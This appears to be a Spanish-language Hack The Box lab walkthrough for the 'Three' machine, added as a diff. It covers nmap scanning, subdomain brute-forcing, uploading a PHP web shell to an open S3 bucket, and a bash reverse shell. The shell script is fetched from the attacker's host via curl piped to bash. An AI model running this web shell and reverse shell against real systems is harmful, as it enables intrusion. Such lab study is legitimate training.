@@ -1,0 +1,39 @@
+HACK THE BOX - THREE MACHINE
+
+- sudo nmap -sV -sC -sS 10.129.246.101																								-Hacemos un barrido con nmap a través de los puertos para encontrar versiones y posibles vulnerabilidades.
+
+			-Encontramos los puertos 22 correspondiente a SSH y puerto 80 abiertos, en el puerto 80 un servidor Apache corriendo(Comunemente un servicio web)
+			-Abrimos la IP en firefox y verificamos si existen posibles vulnerabilidades a partir de estas, es en donde encontramos que existe un posible un dominio y posibles subdominios a partir de estas que explotaremos de la siguiente manera
+			
+- sudo vi /etc/hosts																												-Agregamos el dominio e IP al directorio local (10.129.246.101 thetoppers.htb) 																				
+- gobuster vhost -u http://thetoppers.htb -w /home/Kali/Seclists/Discovery/DNS/subdomains-top1million.txt --append-domain			-Realizamos una busqueda por fuerza bruta de posibles subdominios, (Vhost - Opcion que especifica a gobuster que se hará una enumeración de subdominios, va junto con --apend-domain)
+
+			-Encontramos 2 posibles subdominios (s3.thetoppers.htb - gc._msdcs.thetoppers.htb), de los cuales el primero corresponde a un servicio llamado "Simple Storage Service de Amazon" el cual es objetivo de muchos tipos de vulneración, de modo que intentamos explotarlo.
+		
+- sudo vi /etc/hosts																												-Agregamos el dominio e IP al directorio local (10.129.246.101 s3.thetoppers.htb)		
+			
+			-Al conectarnos a http://s3.thetoppers.htb observamos que existe un servicio corriendo, el cual trataremos de vulnerar conectandonos a través de AWS
+			
+- aws configure 																													-Los parámetros ingresados para este comando, todos "temp", no son irrelevantes, se puede colocar cualquier cosa.
+- aws --endpoint=http://s3.thetoppers.htb s3 ls																						-El comando se utiliza para conectarse a un servicio S3 en la ubicación especificada por el endpoint y listar los objetos en el bucket S3 de Amazon, en el cual encontramos el bucket (thetoppers.htb)
+- aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb																	-Añadiendo "s3://thetoppers.htb" podremos visualizar el contenido dentro del bucket listado anteriormente, encontrando asi (/images - .htaccess - index.php)
+
+			-De lo anterior, nos damos cuenta que la pagina corre en lenguaje php, el cual puede ser objetivo de varios tipo de vulnerabilidades, en este caso utilizaremos reverse shell
+			
+- cd /Hacking/HackTheBox/Three																										-Nos ubicamos en un directorio dedicado
+- vi shell.php																														-Generamos un archivo "shell.php" a través del cual intentaremos ejecutar comandos del sistema en el servidor web donde se ejecuta el código PHP
+	
+		<?php system($_GET["cmd"]); ?>																								-Esta código toma el valor de un parámetro "cmd" a través de la variable global $_GET y lo pasa directamente a la función system(), para ejecutar un comando del sistema.
+		
+- aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb														-Este comando se utiliza para copiar el archivo "shell.php" al bucket de S3 "thetoppers.htb" utilizando el punto de enlace personalizado "http://s3.thetoppers.htb"
+
+- sudo nc -lvnp 443																													-Crea un servidor que escucha conexiones entrantes en el puerto 443, "-l" indica a nc que debe estar en modo listener, "-v" Verbose, "-n" indica que no realice la resolución de nombres (DNS) para las direcciones IP. "-p" el puerto que se usará.
+- python3 -m http.server 8000																										-Establecemos un servidor a traves del puerto 8000 en el directorio en donde generaremos el script en bash y luego haremos un GET (request) desde http://s3.thetoppers.htb, para ejecutar el shell.sh
+- vi shell.sh																														-Generamos un archivo "shell.sh" con un script de bash el cual utilizaremos para establecer una conexión de shell inversa a un dirección IP.
+
+		#!/bin/bash																													-Indica al intérprete que debe usarse para ejecutar el Script bash
+		bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1																				-"bash -i" indica que se inicie una sesion interactiva en Bash.
+		
+- http://s3.thetoppers.htb/shell.php?cmd=curl%2010.10.14.38:8000/shell.sh|bash														-Usamo esta URL para iniciar el "Reverse Shell". 
+
+			-Ahora podemos listar y visualizar cualquier directorio.
